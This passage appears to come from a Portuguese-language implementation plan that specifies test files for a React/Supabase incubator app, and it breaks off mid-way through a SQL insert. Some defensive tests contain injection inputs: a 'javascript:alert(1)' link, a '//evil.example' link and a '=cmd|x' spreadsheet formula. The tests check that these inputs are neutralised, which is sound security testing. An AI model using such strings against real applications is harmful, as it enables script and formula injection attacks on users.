      const h = withCronRunLogging('t', () => Promise.resolve(new Response(JSON.stringify({ ok: status < 400 }), { status, headers: { 'content-type': 'application/json' } })));
      await h(new Request('http://x/', { method: 'POST' }));
      assertEquals(calls.length, expectedCalls, `status ${status}`);
    }
  } finally { globalThis.fetch = realFetch; }
});
```

### `src/hooks/useWorkQueue.rc12.test.tsx`
_(de: Fila de trabalho: "Concluídos" sem limite e "Todos" que não é todos (ids: FES-07))_

**Criar `src/hooks/useWorkQueue.rc12.test.tsx`** (conteúdo exato):

```
import { renderHook, waitFor } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import type { ReactNode } from 'react';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const calls = vi.hoisted(() => ({ list: [] as Array<[string, ...unknown[]]> }));

vi.mock('@/contexts/AuthContext', () => ({
  useAuth: () => ({ user: { id: 'u1' }, roles: ['admin'] }),
}));
vi.mock('@/lib/invokeWithAuth', () => ({ invokeWithAuth: vi.fn() }));
vi.mock('@/lib/supabaseClient', () => {
  const builder = () => {
    const b: Record<string, unknown> = {};
    const rec = (name: string) => (...args: unknown[]) => { calls.list.push([name, ...args]); return b; };
    b.select = rec('select'); b.order = rec('order'); b.eq = rec('eq'); b.in = rec('in'); b.or = rec('or');
    b.then = (resolve: (v: unknown) => unknown) => resolve({ data: [], error: null });
    return b;
  };
  return { supabase: { from: () => builder() } };
});

import { useWorkQueue } from './useWorkQueue';

const wrapper = ({ children }: { children: ReactNode }) => {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return <QueryClientProvider client={qc}>{children}</QueryClientProvider>;
};

async function run(filters?: Parameters<typeof useWorkQueue>[0]) {
  calls.list = [];
  const { result } = renderHook(() => useWorkQueue(filters), { wrapper });
  await waitFor(() => expect(result.current.isSuccess).toBe(true));
  return calls.list.filter(([n]) => n === 'in' || n === 'or' || n === 'eq');
}

describe('useWorkQueue status filter', () => {
  beforeEach(() => { calls.list = []; });

  it('defaults to open + in_progress without touching done items', async () => {
    expect(await run()).toEqual([['in', 'status', ['open', 'in_progress']]]);
  });

  it('bounds done items to today for the "done today" ring (includeDone)', async () => {
    const q = await run({ includeDone: true });
    expect(q).toHaveLength(1);
    const [name, expr] = q[0] as [string, string];
    expect(name).toBe('or');
    const startOfDay = new Date(); startOfDay.setHours(0, 0, 0, 0);
    expect(expr).toBe(`status.in.(open,in_progress),and(status.eq.done,updated_at.gte.${startOfDay.toISOString()})`);
  });

  it('bounds the "done" filter to the last 7 days', async () => {
    const before = Date.now();
    const q = await run({ status: 'done' });
    const expr = q[0][1] as string;
    const m = /^and\(status\.eq\.done,updated_at\.gte\.(.+)\)$/.exec(expr);
    expect(m).not.toBeNull();
    const since = new Date(m![1]).getTime();
    expect(Math.abs(before - since - 7 * 24 * 3600 * 1000)).toBeLessThan(60_000);
  });

  it('"all" (statuses incl. snoozed and done) returns the four statuses', async () => {
    const q = await run({ statuses: ['open', 'in_progress', 'snoozed', 'done'] });
    expect(q).toHaveLength(1);
    expect(q[0][1] as string).toMatch(/^status\.in\.\(open,in_progress,snoozed\),and\(status\.eq\.done,updated_at\.gte\./);
  });

  it('a single non-done status stays an in() filter', async () => {
    expect(await run({ status: 'snoozed' })).toEqual([['in', 'status', ['snoozed']]]);
  });
});
```

### `src/components/mentor/QuickNoteDialog.rc12.test.tsx`
_(de: "Nota rápida" do mentor nunca grava (ids: FES-04, SCH-03))_

**Criar `src/components/mentor/QuickNoteDialog.rc12.test.tsx`** (conteúdo exato):

```
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const state = vi.hoisted(() => ({ inserts: [] as Array<{ table: string; row: Record<string, unknown> }> }));

vi.mock('react-i18next', () => ({
  useTranslation: () => ({
    t: (k: string, o?: unknown) => (typeof o === 'string' ? o : (o as { defaultValue?: string })?.defaultValue ?? k),
  }),
}));
vi.mock('@/contexts/AuthContext', () => ({ useAuth: () => ({ user: { id: 'mentor-1' } }) }));
vi.mock('@/lib/analytics', () => ({ track: vi.fn() }));
vi.mock('@/lib/logger', () => ({ logger: { warn: vi.fn(), error: vi.fn(), info: vi.fn() } }));
vi.mock('@/lib/notify', () => ({ notify: { success: vi.fn(), error: vi.fn(), warn: vi.fn(), info: vi.fn() } }));
vi.mock('@/lib/supabaseClient', () => ({
  supabase: {
    from: (table: string) => ({
      insert: (row: Record<string, unknown>) => {
        state.inserts.push({ table, row });
        return Promise.resolve({ error: null });
      },
    }),
  },
}));

import { QuickNoteDialog } from './QuickNoteDialog';

describe('QuickNoteDialog', () => {
  beforeEach(() => { state.inserts = []; });

  it('saves the note with a visibility value allowed by consultant_notes_visibility_check', async () => {
    render(<QuickNoteDialog open onOpenChange={() => {}} workspaceId="ws-1" />);
    fireEvent.change(screen.getByPlaceholderText('Escreva a sua nota sobre esta startup...'), { target: { value: 'Reunião correu bem' } });
    fireEvent.click(screen.getByRole('button', { name: /guardar|save|common\.save/i }));
    await waitFor(() => expect(state.inserts.length).toBe(1));
    const { table, row } = state.inserts[0];
    expect(table).toBe('consultant_notes');
    // CHECK allows only private_staff | shared_with_founder | shared_with_mentor; the RLS policy for mentors requires the latter.
    expect(row.visibility).toBe('shared_with_mentor');
    expect(row.is_private).toBe(false);
    expect(row.author_id).toBe('mentor-1');
    expect(row.workspace_id).toBe('ws-1');
  });
});
```

### `src/hooks/useGlobalSearch.rc12.test.tsx`
_(de: Pesquisa global: termos com vírgula rebentam 8 pesquisas, erros engolidos e resultados que abrem páginas sem efeito (ids: FES-01, FEX-04, FES-02, FES-16, FEX-17))_

**Criar `src/hooks/useGlobalSearch.rc12.test.tsx`** (conteúdo exato):

```
import { renderHook, waitFor } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import type { ReactNode } from 'react';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const state = vi.hoisted(() => ({
  isStaff: true,
  rows: {} as Record<string, unknown[]>,
  errors: {} as Record<string, unknown>,
  orCalls: [] as string[],
}));

vi.mock('@/i18n', () => ({ default: { t: (k: string) => k, language: 'pt' } }));
vi.mock('@/lib/logger', () => ({ logger: { warn: vi.fn(), error: vi.fn(), info: vi.fn() } }));
vi.mock('@/contexts/AuthContext', () => ({ useAuth: () => ({ isStaff: state.isStaff }) }));
vi.mock('@/lib/supabaseClient', () => {
  const builder = (table: string) => {
    const b: Record<string, unknown> = {};
    const self = () => b;
    b.select = self; b.ilike = self; b.is = self; b.limit = self; b.in = self; b.gte = self;
    b.or = (arg: string) => { state.orCalls.push(arg); return b; };
    b.then = (resolve: (v: unknown) => unknown) =>
      resolve({ data: state.errors[table] ? null : (state.rows[table] ?? []), error: state.errors[table] ?? null });
    return b;
  };
  return { supabase: { from: (t: string) => builder(t), rpc: () => builder('rpc') } };
});

import { orIlike, useGlobalSearch } from './useGlobalSearch';

const wrapper = ({ children }: { children: ReactNode }) => {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return <QueryClientProvider client={qc}>{children}</QueryClientProvider>;
};

describe('orIlike', () => {
  it('quotes the pattern so a comma in the term does not split the PostgREST logic tree', () => {
    expect(orIlike(['name', 'description'], 'Acme, Lda')).toBe(
      'name.ilike."%Acme, Lda%",description.ilike."%Acme, Lda%"',
    );
  });

  it('escapes LIKE wildcards typed by the user and the quoting characters', () => {
    expect(orIlike(['t'], '100%')).toBe('t.ilike."%100\\\\%%"');
    expect(orIlike(['t'], 'a_b')).toBe('t.ilike."%a\\\\_b%"');
    expect(orIlike(['t'], 'x"y,z')).toBe('t.ilike."%x\\"y,z%"');
    expect(orIlike(['t'], 'a\\b')).toBe('t.ilike."%a\\\\\\\\b%"');
  });
});

describe('useGlobalSearch', () => {
  beforeEach(() => {
    state.isStaff = true;
    state.rows = {};
    state.errors = {};
    state.orCalls = [];
  });

  it('builds the or() filters with orIlike (comma-safe)', async () => {
    const { result } = renderHook(() => useGlobalSearch({ query: 'Acme, Lda', types: ['lead'] }), { wrapper });
    await waitFor(() => expect(result.current.isSuccess).toBe(true));
    expect(state.orCalls).toEqual([
      'organization_name.ilike."%Acme, Lda%",contact_name.ilike."%Acme, Lda%",contact_email.ilike."%Acme, Lda%"',
    ]);
  });

  it('points lead results to /crm?open= and people to /profile (staff) or /mentors?mentor= (others)', async () => {
    state.rows.funnel_items = [{ id: 'l1', organization_name: 'Acme', stage: 'new', updated_at: '2026-01-01T00:00:00Z' }];
    state.rows.profiles_safe = [{ id: 'p1', full_name: 'Ana', email: 'a@x.pt' }];
    const staff = renderHook(() => useGlobalSearch({ query: 'ac', types: ['lead', 'person'] }), { wrapper });
    await waitFor(() => expect(staff.result.current.isSuccess).toBe(true));
    const urls = Object.fromEntries((staff.result.current.data ?? []).map((r) => [r.type, r.url]));
    expect(urls.lead).toBe('/crm?open=l1');
    expect(urls.person).toBe('/profile/p1');

    state.isStaff = false;
    const founder = renderHook(() => useGlobalSearch({ query: 'ac', types: ['person'] }), { wrapper });
    await waitFor(() => expect(founder.result.current.isSuccess).toBe(true));
    expect(founder.result.current.data?.[0].url).toBe('/mentors?mentor=p1');
  });

  it('a startup without workspace opens the ecosystem filtered by name', async () => {
    state.rows.startups = [{ id: 's1', name: 'Acme & Co', description: '', updated_at: '2026-01-01T00:00:00Z' }];
    const { result } = renderHook(() => useGlobalSearch({ query: 'acme', types: ['startup'] }), { wrapper });
    await waitFor(() => expect(result.current.isSuccess).toBe(true));
    expect(result.current.data?.[0].url).toBe('/ecosystem?q=Acme%20%26%20Co');
  });

  it('surfaces an error when every source fails instead of an empty result list', async () => {
    state.errors.sessions = { message: 'boom' };
    const { result } = renderHook(() => useGlobalSearch({ query: 'acme', types: ['session'] }), { wrapper });
    await waitFor(() => expect(result.current.isError).toBe(true));
  });

  it('keeps the results of the sources that worked when only one fails', async () => {
    state.errors.sessions = { message: 'boom' };
    state.rows.documents = [{ id: 'd1', workspace_id: 'w1', name: 'Pitch', description: '', updated_at: '2026-01-01T00:00:00Z' }];
    const { result } = renderHook(() => useGlobalSearch({ query: 'pitch', types: ['session', 'document'] }), { wrapper });
    await waitFor(() => expect(result.current.isSuccess).toBe(true));
    expect(result.current.data?.map((r) => r.type)).toEqual(['document']);
  });
});
```

### `src/components/command/CommandPalette.rc12.test.tsx`
_(de: Paleta Ctrl+K: o `cmdk` esconde resultados que o servidor encontrou, rótulos crus, "Mentores" para backoffice e bundle de entrada com react-markdown (ids: FES-03, FEX-12, FEX-14, FES-11))_

**Criar `src/components/command/CommandPalette.rc12.test.tsx`** (conteúdo exato):

```
import { render, screen, fireEvent, waitFor, act } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const state = vi.hoisted(() => ({
  auth: { isAdmin: false, isConsultor: false, isStaff: true, isMentor: false, isFounder: false },
  results: [] as unknown[],
  messages: [] as unknown[],
}));

vi.mock('react-i18next', () => ({
  useTranslation: () => ({
    t: (k: string, o?: unknown) => (typeof o === 'string' ? o : (o as { defaultValue?: string })?.defaultValue ?? k),
  }),
}));
vi.mock('@/contexts/AuthContext', () => ({ useAuth: () => state.auth }));
vi.mock('@/hooks/useWorkspaces', () => ({ useWorkspaces: () => ({ data: [] }) }));
vi.mock('@/hooks/useGlobalSearch', () => ({ useGlobalSearch: () => ({ data: state.results }) }));
vi.mock('@/hooks/useCopilotChat', () => ({
  useCopilotChat: () => ({ messages: state.messages, isThinking: false, send: vi.fn(), reset: vi.fn() }),
}));

import { CommandPalette } from './CommandPalette';

// cmdk scrolls the selected item into view (not implemented by jsdom)
Element.prototype.scrollIntoView = vi.fn();

function openPalette() {
  render(<MemoryRouter><CommandPalette /></MemoryRouter>);
  act(() => { fireEvent.keyDown(document, { key: 'k', ctrlKey: true }); });
}

describe('CommandPalette (RC12)', () => {
  beforeEach(() => {
    state.auth = { isAdmin: false, isConsultor: false, isStaff: true, isMentor: false, isFounder: false };
    state.results = [];
    state.messages = [];
  });

  it('shows server results even when the typed term is not in the visible text (no client-side re-filter)', async () => {
    state.results = [
      { type: 'note', id: 'n1', workspace_id: 'w', title: 'Nota', snippet: 'x'.repeat(120) + ' orçamento', updated_at: '2026-01-01', url: '/workspace/w?tab=notes' },
      { type: 'startup', id: 's1', workspace_id: '', title: 'Acme Robotics', snippet: '', updated_at: '2026-01-01', url: '/ecosystem?q=Acme' },
    ];
    openPalette();
    const input = await screen.findByRole('combobox');
    fireEvent.change(input, { target: { value: 'orçamento' } });
    await waitFor(() => expect(screen.getByText('Acme Robotics')).toBeTruthy());
    expect(screen.getByText('Nota')).toBeTruthy();
    // group headings use the translated type label, not the raw type key
    expect(screen.queryByText('startup')).toBeNull();
    expect(screen.getByText('search.types.startups')).toBeTruthy();
  });

  it('keeps filtering the navigation list by the typed text (1 character)', async () => {
    openPalette();
    const input = await screen.findByRole('combobox');
    expect(await screen.findByText('Espaços')).toBeTruthy();
    fireEvent.change(input, { target: { value: 'z' } });
    await waitFor(() => expect(screen.queryByText('Espaços')).toBeNull());
  });

  it('does not offer "Mentores" to backoffice (isStaff without admin/consultor)', async () => {
    openPalette();
    await screen.findByRole('combobox');
    expect(screen.queryByText('nav.mentors')).toBeNull();
  });

  it('offers "Mentores" to admin', async () => {
    state.auth = { ...state.auth, isAdmin: true };
    openPalette();
    await screen.findByRole('combobox');
    expect(screen.getByText('nav.mentors')).toBeTruthy();
  });
});
```

### `src/components/command/CopilotMarkdown.test.tsx`
_(de: Paleta Ctrl+K: o `cmdk` esconde resultados que o servidor encontrou, rótulos crus, "Mentores" para backoffice e bundle de entrada com react-markdown (ids: FES-03, FEX-12, FEX-14, FES-11))_

**Criar `src/components/command/CopilotMarkdown.test.tsx`** (conteúdo exato):

```
import { render, screen, fireEvent } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';
import CopilotMarkdown from './CopilotMarkdown';

describe('CopilotMarkdown', () => {
  it('navigates in-app for single-slash paths without leaving the SPA', () => {
    const onNavigate = vi.fn();
    render(<CopilotMarkdown content="[ver](/workspace/abc?tab=kpis)" onNavigate={onNavigate} />);
    fireEvent.click(screen.getByText('ver'));
    expect(onNavigate).toHaveBeenCalledWith('/workspace/abc?tab=kpis');
  });

  it('opens http(s) links in a new tab with noopener and does not intercept the click', () => {
    const onNavigate = vi.fn();
    render(<CopilotMarkdown content="[site](https://example.com/x)" onNavigate={onNavigate} />);
    const a = screen.getByText('site').closest('a')!;
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toBe('noopener noreferrer');
    fireEvent.click(a);
    expect(onNavigate).not.toHaveBeenCalled();
  });

  it.each(['javascript:alert(1)', '//evil.example/x'])('renders %s as plain text, not a link', (href) => {
    render(<CopilotMarkdown content={`[x](${href})`} onNavigate={vi.fn()} />);
    expect(screen.getByText('x').closest('a')).toBeNull();
  });
});
```

### `src/hooks/useSkipCheckin.test.tsx`
_(de: Check-in mensal mostrado a team_member: "Saltar" finge sucesso e "Concluir" dá Access denied (ids: FEF-01))_

**Criar `src/hooks/useSkipCheckin.test.tsx`** (conteúdo exato):

```
import { createElement, type ReactNode } from 'react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { renderHook, waitFor, act } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';

const state = { rows: [] as Array<{ id: string }> };
vi.mock('@/lib/supabaseClient', () => ({
  supabase: {
    from: () => {
      const chain: Record<string, unknown> = {};
      for (const m of ['update', 'eq', 'select']) chain[m] = () => chain;
      chain.then = (resolve: (v: unknown) => unknown) => Promise.resolve({ data: state.rows, error: null }).then(resolve);
      return chain;
    },
  },
}));
const notify = vi.hoisted(() => ({ info: vi.fn(), error: vi.fn(), success: vi.fn() }));
vi.mock('@/lib/notify', () => ({ notify }));

import { useSkipCheckin } from './useCheckins';

function wrapper({ children }: { children: ReactNode }) {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false }, mutations: { retry: false } } });
  return createElement(QueryClientProvider, { client }, children);
}

describe('useSkipCheckin', () => {
  it('não anuncia sucesso quando a RLS bloqueou o UPDATE (0 linhas)', async () => {
    state.rows = [];
    const { result } = renderHook(() => useSkipCheckin(), { wrapper });
    await act(async () => { await result.current.mutateAsync('i1').catch(() => undefined); });
    await waitFor(() => expect(result.current.isError).toBe(true));
    expect(notify.info).not.toHaveBeenCalled();
    expect(notify.error).toHaveBeenCalled();
  });
  it('anuncia sucesso quando a linha foi atualizada', async () => {
    notify.info.mockClear(); state.rows = [{ id: 'i1' }];
    const { result } = renderHook(() => useSkipCheckin(), { wrapper });
    await act(async () => { await result.current.mutateAsync('i1'); });
    expect(notify.info).toHaveBeenCalledTimes(1);
  });
});
```

### `src/components/admin/__tests__/AdminBackoffice.subtab.rc12.test.tsx`
_(de: O sub-separador do Backoffice não segue o URL (ids: FEB-02))_

**Criar `src/components/admin/__tests__/AdminBackoffice.subtab.rc12.test.tsx`** (conteúdo exato):

```
import React from 'react';
import { describe, it, expect, vi } from 'vitest';
import { render, screen, act, waitFor } from '@testing-library/react';
import { BrowserRouter, useNavigate } from 'react-router-dom';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';

vi.mock('@/contexts/AuthContext', () => ({
  useAuth: () => ({ isAdmin: false, isBackoffice: true, isConsultor: false, isStaff: true }),
}));
vi.mock('@/lib/supabaseClient', () => {
  const chain: any = new Proxy(function () {}, {
    get: (_t, p) => p === 'then' ? (res: any) => res({ data: [], error: null }) : chain,
    apply: () => chain,
  });
  return { supabase: { from: () => chain, rpc: () => chain, auth: {} } };
});
vi.mock('@/components/backoffice/BackofficeDashboard', () => ({ BackofficeDashboard: () => <div data-testid="stub-dashboard" /> }));
vi.mock('@/components/backoffice/BackofficeContractsTab', () => ({ BackofficeContractsTab: () => <div data-testid="stub-contracts" /> }));
vi.mock('@/components/backoffice/BackofficeIncubationTypesTab', () => ({ BackofficeIncubationTypesTab: () => <div data-testid="stub-incubation" /> }));
vi.mock('@/components/backoffice/InfrastructureTab', () => ({ InfrastructureTab: () => <div data-testid="stub-infra" /> }));
vi.mock('@/components/backoffice/SpaceOperationsConsole', () => ({ SpaceOperationsConsole: () => <div data-testid="stub-spaces" /> }));
vi.mock('@/components/backoffice/OpsActionPrompts', () => ({ OpsActionPrompts: () => null }));
vi.mock('@/components/admin/ContractLifecycleHub', () => ({ ContractLifecycleHub: () => null }));
vi.mock('@/components/admin/AdminArchiveBackupTab', () => ({ AdminArchiveBackupTab: () => <div data-testid="stub-archive" /> }));
vi.mock('@/components/staff/FounderRequestsInbox', () => ({ FounderRequestsInbox: () => <div data-testid="stub-founder-requests" /> }));
vi.mock('@/components/admin/StartupChangeRequestsInbox', () => ({ StartupChangeRequestsInbox: () => null }));
import { AdminBackoffice } from '@/components/admin/AdminBackoffice';

let nav: (to: string) => void = () => {};
function Nav() { const n = useNavigate(); nav = (to) => n(to); return null; }
function setup(url: string) {
  window.history.pushState({}, '', url);
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(<QueryClientProvider client={qc}><BrowserRouter><Nav /><AdminBackoffice /></BrowserRouter></QueryClientProvider>);
}
const has = (id: string) => screen.queryByTestId(id) !== null;
const shown = (id: string) => waitFor(() => expect(has(id)).toBe(true));

describe('AdminBackoffice: sub-tab follows the URL', () => {
  it('?subtab=spaces opens spaces', async () => {
    setup('/admin?tab=backoffice&subtab=spaces');
    await shown('stub-spaces');
    expect(has('stub-dashboard')).toBe(false);
  });
  it('navigating while mounted switches the visible sub-tab', async () => {
    setup('/admin?tab=backoffice');
    expect(has('stub-dashboard')).toBe(true);
    await act(async () => { nav('/admin?tab=backoffice&subtab=contracts'); });
    await shown('stub-contracts');
    await act(async () => { nav('/admin?tab=backoffice&subtab=spaces'); });
    await shown('stub-spaces');
  });
  it('legacy ?section= and ?subtab=waitlist/founder-requests resolve', async () => {
    let r = setup('/admin?tab=backoffice&section=contracts'); await shown('stub-contracts'); r.unmount();
    r = setup('/admin?tab=backoffice&subtab=waitlist'); await shown('stub-spaces'); r.unmount();
    r = setup('/admin?tab=backoffice&subtab=founder-requests'); await shown('stub-founder-requests'); r.unmount();
    r = setup('/admin?tab=backoffice&subtab=invoices'); await shown('stub-contracts');
  });
});

describe('regression: link without subtab', () => {
  it('ContractLifecycleHub-style link (no subtab) from contracts drops to dashboard', async () => {
    setup('/admin?tab=backoffice&subtab=contracts');
    await shown('stub-contracts');
    await act(async () => { nav('/admin?tab=backoffice&contract=abc'); });
    await waitFor(() => expect(has('stub-dashboard')).toBe(true));
  });
  it('with subtab=contracts in link it stays on contracts', async () => {
    setup('/admin?tab=backoffice&subtab=contracts');
    await shown('stub-contracts');
    await act(async () => { nav('/admin?tab=backoffice&subtab=contracts&contract=abc'); });
    await shown('stub-contracts');
  });
});
```

### `src/components/admin/__tests__/adminTabAccess.rc12.test.ts`
_(de: Separador Relatórios mostra zeros ao backoffice; relatório CSV trunca a 1000 linhas e usa serializador próprio (ids: FEB-03, FEB-04, HRD-09))_

**Criar `src/components/admin/__tests__/adminTabAccess.rc12.test.ts`** (conteúdo exato):

```
import { describe, it, expect } from 'vitest';
import { canSeeAdminTab } from '../adminTabAccess';

const admin = { isAdmin: true, isBackoffice: false, isConsultor: false };
const consultor = { isAdmin: false, isBackoffice: false, isConsultor: true };
const backoffice = { isAdmin: false, isBackoffice: true, isConsultor: false };

describe('canSeeAdminTab', () => {
  it('admin sees every tab', () => {
    for (const tab of ['users', 'backoffice', 'analytics', 'kpis', 'approvals', 'system-health']) {
      expect(canSeeAdminTab(tab, admin)).toBe(true);
    }
  });

  it('backoffice cannot see analytics (RLS gives it no action_items/milestones/sessions/kpi_values)', () => {
    expect(canSeeAdminTab('analytics', backoffice)).toBe(false);
    expect(canSeeAdminTab('analytics', consultor)).toBe(true);
  });

  it('backoffice sees approvals and backoffice only, not admin-only or consultor tabs', () => {
    expect(canSeeAdminTab('approvals', backoffice)).toBe(true);
    expect(canSeeAdminTab('backoffice', backoffice)).toBe(true);
    for (const tab of ['users', 'mentors', 'compliance', 'data-quality', 'system-health', 'programs-setup', 'kpis', 'templates']) {
      expect(canSeeAdminTab(tab, backoffice)).toBe(false);
    }
  });

  it('consultor sees programs content but not backoffice or admin-only tabs', () => {
    for (const tab of ['programs-setup', 'kpis', 'templates', 'support-materials', 'analytics', 'approvals']) {
      expect(canSeeAdminTab(tab, consultor)).toBe(true);
    }
    for (const tab of ['backoffice', 'users', 'enrollment', 'surveys']) {
      expect(canSeeAdminTab(tab, consultor)).toBe(false);
    }
  });
});
```

### `src/components/analytics/BulkReportGenerator.rc12.test.tsx`
_(de: Separador Relatórios mostra zeros ao backoffice; relatório CSV trunca a 1000 linhas e usa serializador próprio (ids: FEB-03, FEB-04, HRD-09))_

**Criar `src/components/analytics/BulkReportGenerator.rc12.test.tsx`** (conteúdo exato):

```
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { describe, expect, it, vi } from 'vitest';
import '@/i18n';

// 1500 action_items in the DB; the API returns at most 1000 rows per request (PostgREST max-rows).
const ACTIONS = Array.from({ length: 1500 }, (_, i) => ({ id: String(i).padStart(6, '0'), workspace_id: 'w1', status: 'pending', due_date: '2020-01-01' }));
const calls: string[] = [];
vi.mock('@/lib/supabaseClient', () => {
  const builder = (table: string) => {
    let from = 0, to = 999;
    const q: any = {};
    for (const m of ['select', 'order', 'eq', 'in', 'is']) q[m] = () => q;
    q.range = (f: number, t: number) => { from = f; to = Math.min(t, f + 999); return q; };
    q.then = (res: any) => {
      calls.push(table);
      let data: any[] = [];
      if (table === 'workspaces') data = [{ id: 'w1', stage: 'mvp', health_score: 'healthy', startup: { name: '=cmd|x' }, program: { name: 'P' } }];
      if (table === 'action_items') data = ACTIONS.slice(from, to + 1).slice(0, 1000);
      return Promise.resolve({ data, error: null }).then(res);
    };
    return q;
  };
  return { supabase: { from: (t: string) => builder(t) } };
});
vi.mock('@/hooks/useWorkspaces', () => ({ usePrograms: () => ({ data: [{ id: 'p1', name: 'Prog 1' }] }) }));
const saved: { blob?: Blob } = {};
(globalThis as any).URL.createObjectURL = (b: Blob) => { saved.blob = b; return 'blob:x'; };
(globalThis as any).URL.revokeObjectURL = () => {};
import { BulkReportGenerator } from '@/components/analytics/BulkReportGenerator';

describe('BulkReportGenerator', () => {
  it('counts all 1500 actions (not the 1000-row API cap) and neutralizes formulas', async () => {
    const qc = new QueryClient();
    render(<QueryClientProvider client={qc}><BulkReportGenerator /></QueryClientProvider>);
    fireEvent.click(screen.getByRole('button', { name: /Generate CSV Report/i }));
    await waitFor(() => expect(saved.blob).toBeTruthy());
    const text = await new Promise<string>(r => { const fr = new FileReader(); fr.onload = () => r(String(fr.result)); fr.readAsText(saved.blob!); });
    const lines = text.split(/\r?\n/);
    const cols = lines[1].split('","').map(c => c.replace(/^"|"$/g, ''));
    expect(cols[0]).toBe("'=cmd|x");
    expect(cols[6]).toBe('1500');   // Total Actions
    expect(cols[8]).toBe('1500');   // Overdue Actions
  });
});
```

### `src/components/admin/__tests__/AdminMissionControlDirectory.rc12.test.tsx`
_(de: Separador Relatórios mostra zeros ao backoffice; relatório CSV trunca a 1000 linhas e usa serializador próprio (ids: FEB-03, FEB-04, HRD-09))_

**Criar `src/components/admin/__tests__/AdminMissionControlDirectory.rc12.test.tsx`** (conteúdo exato):

```
import React from 'react';
import { describe, it, expect, vi } from 'vitest';
import { render, screen, fireEvent } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import '@/i18n';

const role = vi.hoisted(() => ({ v: { isAdmin: false, isBackoffice: true, isConsultor: false } as any }));
vi.mock('@/contexts/AuthContext', () => ({ useAuth: () => role.v }));
import { AdminMissionControlDirectory } from '@/components/admin/AdminMissionControlDirectory';

const labels = () => Array.from(document.querySelectorAll('button span.text-xs.font-medium')).map(e => e.textContent);

describe('Mission Control directory vs role', () => {
  it('backoffice only sees entries it can open', () => {
    role.v = { isAdmin: false, isBackoffice: true, isConsultor: false };
    render(<MemoryRouter initialEntries={['/admin']}><AdminMissionControlDirectory /></MemoryRouter>);
    const n = labels().length; 
    // expected: ecosystem, approvals, backoffice (+ CRM route) -> 4 ; NOT users/mentors/compliance/... 
    expect(n).toBeLessThanOrEqual(5);
    expect(document.body.textContent).not.toMatch(/Utilizadores|Users|Mentores externos|External Mentors/);
  });
  it('admin sees everything', () => {
    role.v = { isAdmin: true, isBackoffice: false, isConsultor: false };
    render(<MemoryRouter initialEntries={['/admin']}><AdminMissionControlDirectory /></MemoryRouter>);
    expect(labels().length).toBe(18);
  });
});
```

### `supabase/functions/_shared/xlsmCanonical_e2e_test.ts`
_(de: Suites pgTAP partidas por defeitos dos próprios testes (ids: DRF-05, OPS-05, RV-03, HRD-14, OPS-15, RV-08))_

**Alterar `supabase/functions/_shared/xlsmCanonical_e2e_test.ts`** (diff; os números de linha são do ficheiro original):

```diff
--- a/supabase/functions/_shared/xlsmCanonical_e2e_test.ts
+++ b/supabase/functions/_shared/xlsmCanonical_e2e_test.ts
@@ -17,4 +17,7 @@ import JSZip from "https://esm.sh/jszip@3.10.1";
 const TEMPLATE_PATH = "/tmp/tpl.xlsm";
 const EXPECTED_SHA = "1a843d03fdef830b8129e76689563eee7622f04073a47bfbff9a985a60ebec4e";
+// The canonical template only exists in the live database; skip (instead of failing) when it was not exported to TEMPLATE_PATH.
+const HAS_TEMPLATE = (() => { try { return Deno.statSync(TEMPLATE_PATH).isFile; } catch { return false; } })();
+const tpl = (name: string, fn: () => Promise<void>) => Deno.test({ name, ignore: !HAS_TEMPLATE, fn });
 
 async function sha256Hex(bytes: Uint8Array): Promise<string> {
@@ -32,5 +35,5 @@ async function readTemplate(): Promise<Uint8Array> {
 }
 
-Deno.test("canonical XLSM: sheet inventory matches map expectations", async () => {
+tpl("canonical XLSM: sheet inventory matches map expectations", async () => {
   const reader = await openXlsmReader(await readTemplate());
   const wanted = ["Pressupostos", "7. Serviço da Dívida"];
@@ -38,5 +41,5 @@ Deno.test("canonical XLSM: sheet inventory matches map expectations", async () =
 });
 
-Deno.test("canonical XLSM: sampled input cells resolve to values", async () => {
+tpl("canonical XLSM: sampled input cells resolve to values", async () => {
   const reader = await openXlsmReader(await readTemplate());
   const samples: Array<{ sheet: string; address: string; kind: "num" | "text" }> = [
@@ -59,5 +62,5 @@ Deno.test("canonical XLSM: sampled input cells resolve to values", async () => {
 });
 
-Deno.test("canonical XLSM: round-trip preserves vbaProject.bin byte-identity", async () => {
+tpl("canonical XLSM: round-trip preserves vbaProject.bin byte-identity", async () => {
   const original = await readTemplate();
```

### `supabase/tests/rc12_sql_sec_data_guards.test.sql`
_(de: Teste pgTAP das proteções de dados (ids: E2E-05, ED3-05, SCH-03, FEF-11, FEB-01, FES-08))_

**Criar `supabase/tests/rc12_sql_sec_data_guards.test.sql`** (conteúdo exato):

```sql
-- RC12 (sql_sec) · E2E-05, ED3-05, SCH-03/FES-04, FEF-11, FEB-01/FES-08/FEX-01.
-- Falha antes das migrações 20261103103000..20261103107000 e passa depois. Corre com `supabase test db`.
BEGIN;
SELECT plan(18);

INSERT INTO auth.users (id, email, email_confirmed_at) VALUES
  ('5ec10000-0000-4000-8000-000000000001', 'rc12sec2-cons@test.com', now()),
  ('5ec10000-0000-4000-8000-000000000002', 'rc12sec2-mentor@test.com', now()),
  ('5ec10000-0000-4000-8000-000000000003', 'rc12sec2-founder@test.com', now()),
  ('5ec10000-0000-4000-8000-000000000004', 'rc12sec2-member@test.com', now()),
  ('5ec10000-0000-4000-8000-000000000005', 'rc12sec2-admin@test.com', now())
ON CONFLICT (id) DO NOTHING;
INSERT INTO public.profiles (id, email, account_status) VALUES
